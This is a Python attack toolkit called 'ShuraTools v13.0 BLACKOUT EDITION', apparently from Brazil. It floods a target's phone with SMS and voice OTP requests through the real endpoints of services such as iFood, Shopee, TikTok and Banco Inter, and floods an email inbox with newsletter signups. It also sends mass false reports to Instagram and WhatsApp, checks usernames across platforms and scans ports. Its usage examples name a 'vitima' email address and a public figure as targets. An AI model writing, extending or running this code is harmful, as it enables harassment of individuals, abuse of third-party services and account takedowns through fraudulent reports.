#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShuraTools v13.0 BLACKOUT EDITION
Usage: python ShuraTools.py --sms --target 5511999999999 --qty 1000 --threads 500
"""

import asyncio, aiohttp, random, argparse, time, socket, os, sys, string, threading
from concurrent.futures import ThreadPoolExecutor

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    print("[!] pip install colorama aiohttp")
    sys.exit(1)

BANNER = f"""
{Fore.RED}███████╗██╗  ██╗██╗   ██╗██████╗  █████╗ {Fore.WHITE}██████╗ ██╗  ██╗
{Fore.RED}██╔════╝██║  ██║██║   ██║██╔══██╗██╔══██╗{Fore.WHITE}██╔══██╗██║  ██║
{Fore.RED}███████╗███████║██║   ██║██████╔╝███████║{Fore.WHITE}██████╔╝███████║
{Fore.RED}╚════██║██╔══██║██║   ██║██╔══██╗██╔══██║{Fore.WHITE}██╔═══╝ ██╔══██║
{Fore.RED}███████║██║  ██║╚██████╔╝██║  ██║██║  ██║{Fore.WHITE}██║     ██║  ██║
{Fore.RED}╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝{Fore.WHITE}╚═╝     ╚═╝  ╚═╝
{Fore.YELLOW}SMS | Call | Email | IG | Zap | OSINT | Scan
{Fore.WHITE}v13.0 BLACKOUT EDITION - by Shura
"""

stats = {"success": 0, "fail": 0}
LOCK = threading.Lock()

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/121.0.0.0"
]

def log(m, t="i"):
    c = {"i":Fore.WHITE+"[*] ", "s":Fore.GREEN+"[+] ", "e":Fore.RED+"[-] ", "w":Fore.YELLOW+"[!] "}
    with LOCK: print(f"{c.get(t)}{m}{Style.RESET_ALL}")

# ========== API DATABASE ==========
APIS = {
    "sms": [
        {"n": "iFood", "u": "https://marketplace.ifood.com.br/v1/merchants/search/phone-number", "d": {"phoneNumber": "{T}"}, "h": {"Content-Type": "application/json"}},
        {"n": "Magalu", "u": "https://sacola.magazineluiza.com.br/api/v1/customer/send-otp", "d": {"phone": "{T}"}, "h": {"Content-Type": "application/json"}},
        {"n": "Shopee", "u": "https://shopee.com.br/api/v2/authentication/send_code", "d": {"phone": "{T}", "type": 1}, "h": {"Content-Type": "application/json"}},
        {"n": "TikTok", "u": "https://www.tiktok.com/passport/web/send_code/", "d": {"mobile": "{T}", "account_sdk_source": "web"}, "h": {"Content-Type": "application/json"}},
        {"n": "OLX", "u": "https://www.olx.com.br/api/auth/authenticate", "d": {"phone": "{T}"}, "h": {"Content-Type": "application/json"}}
    ],
    "call": [
        {"n": "QuintoAndar", "u": "https://api.quintoandar.com.br/api/v1/auth/send-otp", "d": {"phone": "{T}", "method": "VOICE"}, "h": {"Content-Type": "application/json"}},
        {"n": "Inter", "u": "https://api.inter.co/v1/auth/request-otp", "d": {"phone": "{T}", "type": "VOICE"}, "h": {"Content-Type": "application/json"}},
        {"n": "iFood", "u": "https://wsloja.ifood.com.br/api/v1/customers/phone/verify", "d": {"phone": "{T}", "method": "call"}, "h": {"Content-Type": "application/json"}}
    ],
    "email": [
        {"n": "Tecnoblog", "u": "https://tecnoblog.net/wp-admin/admin-ajax.php", "d": {"action": "tnp", "na": "s", "ne": "{T}", "ny": "on"}, "h": {}},
        {"n": "TheNews", "u": "https://thenewscc.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
        {"n": "InvestNews", "u": "https://investnews.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
        {"n": "TheBrief", "u": "https://thebrief.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
        {"n": "Startups", "u": "https://startups.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}}
    ]
}

# ========== ASYNC BOMBER ==========
async def bomber_async(target, mode, qty, threads):
    global stats
    stats = {"success": 0, "fail": 0}
    apis = APIS.get(mode, [])
    
    log(f"Iniciando {mode.upper()} Bomber ASYNC", "w")
    log(f"Target: {target} | Qty: {qty} | Threads: {threads}", "i")
    
    sem = asyncio.Semaphore(threads)
    
    async def attack(api, idx):
        async with sem:
            try:
                headers = {**api["h"], "User-Agent": random.choice(UA_LIST)}
                data = {k: v.replace("{T}", target) if isinstance(v, str) else v for k, v in api["d"].items()}
                
                async with aiohttp.ClientSession() as session:
                    async with session.post(api["u"], json=data, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as res:
                        if res.status < 400:
                            stats["success"] += 1
                            log(f"[{idx+1}/{qty}] {api['n']} → OK", "s")
                        else:
                            stats["fail"] += 1
                            log(f"[{idx+1}/{qty}] {api['n']} → {res.status}", "w")
            except:
                stats["fail"] += 1
                log(f"[{idx+1}/{qty}] {api['n']} → Timeout", "e")
    
    tasks = [attack(random.choice(apis), i) for i in range(qty)]
    await asyncio.gather(*tasks)
    
    log(f"Concluído! ✓ {stats['success']} | ✗ {stats['fail']}", "i")

# ========== MASS REPORT ASYNC ==========
async def mass_report_async(target, platform, qty, threads):
    log(f"{platform.upper()} Mass Report ASYNC: {target}", "w")
    
    if platform == "ig":
        url = "https://i.instagram.com/api/v1/users/web_report/"
        data = {"username": target, "source_name": "profile", "reason_id": "spam"}
    else:
        url = "https://v.whatsapp.net/v2/report"
        data = {"phone": target, "reason": "spam"}
    
    sem = asyncio.Semaphore(threads)
    
    async def report(idx):
        async with sem:
            try:
                headers = {"User-Agent": random.choice(UA_LIST)}
                async with aiohttp.ClientSession() as session:
                    async with session.post(url, data=data, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as res:
                        if res.status < 400:
                            log(f"Report {idx+1}/{qty} → OK", "s")
                        else:
                            log(f"Report {idx+1}/{qty} → {res.status}", "w")
            except:
                log(f"Report {idx+1}/{qty} → Timeout", "e")
    
    tasks = [report(i) for i in range(qty)]
    await asyncio.gather(*tasks)

# ========== OSINT DEEP ASYNC ==========
async def osint_deep_async(target):
    log(f"OSINT Deep ASYNC: {target}", "w")
    u = target.replace("@", "")
    
    platforms = {
        "Instagram": f"https://www.instagram.com/{u}/",
        "GitHub": f"https://github.com/{u}",
        "TikTok": f"https://www.tiktok.com/@{u}",
        "Twitter": f"https://twitter.com/{u}",
        "LinkedIn": f"https://www.linkedin.com/in/{u}",
        "Facebook": f"https://www.facebook.com/{u}",
        "Reddit": f"https://www.reddit.com/user/{u}",
        "YouTube": f"https://www.youtube.com/@{u}",
        "Twitch": f"https://www.twitch.tv/{u}",
        "Medium": f"https://medium.com/@{u}",
        "Pastebin": f"https://pastebin.com/u/{u}",
        "Telegram": f"https://t.me/{u}",
        "Spotify": f"https://open.spotify.com/user/{u}",
        "Pinterest": f"https://www.pinterest.com/{u}",
        "Tumblr": f"https://{u}.tumblr.com",
        "Flickr": f"https://www.flickr.com/people/{u}",
        "Vimeo": f"https://vimeo.com/{u}",
        "SoundCloud": f"https://soundcloud.com/{u}",
        "DeviantArt": f"https://www.deviantart.com/{u}",
        "Steam": f"https://steamcommunity.com/id/{u}"
    }
    
    print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    
    async def check(name, url):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
                    if r.status == 200:
                        log(f"{name}: {Fore.GREEN}ENCONTRADO{Style.RESET_ALL}", "s")
                        print(f"   {Fore.BLUE}→ {url}{Style.RESET_ALL}")
                    else:
                        log(f"{name}: Não encontrado", "i")
        except:
            log(f"{name}: Timeout", "e")
    
    tasks = [check(name, url) for name, url in platforms.items()]
    await asyncio.gather(*tasks)
    
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")

# ========== PORT SCANNER ==========
def port_scan(target):
    log(f"Scanning {target}...", "w")
    try:
        ip = socket.gethostbyname(target)
        log(f"IP: {Fore.GREEN}{ip}{Style.RESET_ALL}", "i")
        
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        for p in [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389, 5432, 8080, 8443]:
            s = socket.socket()
            s.settimeout(0.5)
            if s.connect_ex((ip, p)) == 0:
                log(f"Port {p} → {Fore.GREEN}OPEN{Style.RESET_ALL}", "s")
            s.close()
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
    except Exception as e:
        log(f"Erro: {e}", "e")

# ========== CLI ==========
def main():
    print(BANNER)
    
    ap = argparse.ArgumentParser(description="ShuraTools v13.0 BLACKOUT")
    ap.add_argument("--sms", action="store_true", help="SMS Bomber ASYNC")
    ap.add_argument("--call", action="store_true", help="Call Bomber ASYNC")
    ap.add_argument("--email", action="store_true", help="Email Bomber ASYNC")
    ap.add_argument("--ig", action="store_true", help="Instagram Mass Report ASYNC")
    ap.add_argument("--zap", action="store_true", help="WhatsApp Mass Report ASYNC")
    ap.add_argument("--osint", action="store_true", help="OSINT Deep ASYNC")
    ap.add_argument("--scan", action="store_true", help="Port Scanner")
    ap.add_argument("--target", required=True, help="Alvo")
    ap.add_argument("--qty", type=int, default=100, help="Quantidade (padrão: 100)")
    ap.add_argument("--threads", type=int, default=100, help="Threads (padrão: 100)")
    
    args = ap.parse_args()
    
    # Executa com asyncio
    if args.sms:
        asyncio.run(bomber_async(args.target, "sms", args.qty, args.threads))
    elif args.call:
        asyncio.run(bomber_async(args.target, "call", args.qty, args.threads))
    elif args.email:
        asyncio.run(bomber_async(args.target, "email", args.qty, args.threads))
    elif args.ig:
        asyncio.run(mass_report_async(args.target, "ig", args.qty, args.threads))
    elif args.zap:
        asyncio.run(mass_report_async(args.target, "zap", args.qty, args.threads))
    elif args.osint:
        asyncio.run(osint_deep_async(args.target))
    elif args.scan:
        port_scan(args.target)
    else:
        ap.print_help()
        print(f"\n{Fore.YELLOW}Exemplos:{Style.RESET_ALL}")
        print(f"  python ShuraTools.py --sms --target 5511999999999 --qty 1000 --threads 500")
        print(f"  python ShuraTools.py --email --target vitima@gmail.com --qty 500 --threads 200")
        print(f"  python ShuraTools.py --ig --target elonmusk --qty 200 --threads 100")
        print(f"  python ShuraTools.py --osint --target elonmusk")

if __name__ == "__main__":
    main()
